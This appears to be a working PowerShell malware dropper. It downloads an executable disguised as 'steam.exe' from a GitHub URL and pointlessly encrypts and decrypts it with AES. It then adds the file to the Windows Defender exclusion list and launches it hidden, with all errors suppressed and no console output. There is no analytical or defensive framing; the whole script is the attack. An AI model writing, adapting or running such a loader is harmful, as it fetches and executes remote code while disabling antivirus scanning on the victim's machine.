# URL for the original file
$fileUrl = "https://github.com/icodeinbinary/xw/raw/refs/heads/main/steam.exe"
$tempFile = "$env:USERPROFILE\Downloads\steam.exe"
$encryptedFile = "$env:USERPROFILE\Downloads\EncryptedFile.dat"
$keyFile = "$env:USERPROFILE\Downloads\AESKey.key"
$ivFile = "$env:USERPROFILE\Downloads\AESIV.iv"
$decryptedFile = "$env:USERPROFILE\Downloads\DecryptedSteam.exe"

# Step 1: Download the original file
Invoke-WebRequest -Uri $fileUrl -OutFile $tempFile -ErrorAction SilentlyContinue

# Step 2: Encrypt the file
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.KeySize = 256
$aes.GenerateKey()
$aes.GenerateIV()

# Save the key and IV
[System.IO.File]::WriteAllBytes($keyFile, $aes.Key)
[System.IO.File]::WriteAllBytes($ivFile, $aes.IV)

# Encrypt the file content
$fileContent = [System.IO.File]::ReadAllBytes($tempFile)
$cryptoTransform = $aes.CreateEncryptor()
$encryptedContent = $cryptoTransform.TransformFinalBlock($fileContent, 0, $fileContent.Length)
[System.IO.File]::WriteAllBytes($encryptedFile, $encryptedContent)

# Step 3: Decrypt the file
$aesKey = [System.IO.File]::ReadAllBytes($keyFile)
$aesIV = [System.IO.File]::ReadAllBytes($ivFile)
$encryptedContent = [System.IO.File]::ReadAllBytes($encryptedFile)

$aes.Key = $aesKey
$aes.IV = $aesIV
$cryptoTransform = $aes.CreateDecryptor()
$decryptedContent = $cryptoTransform.TransformFinalBlock($encryptedContent, 0, $encryptedContent.Length)
[System.IO.File]::WriteAllBytes($decryptedFile, $decryptedContent)

# Step 4: Add to Windows Defender exclusions (optional)
Add-MpPreference -ExclusionPath $decryptedFile -ErrorAction SilentlyContinue

# Step 5: Execute the decrypted file
Start-Process -FilePath $decryptedFile -WindowStyle Hidden

# The script runs completely silently in the background without any console output.
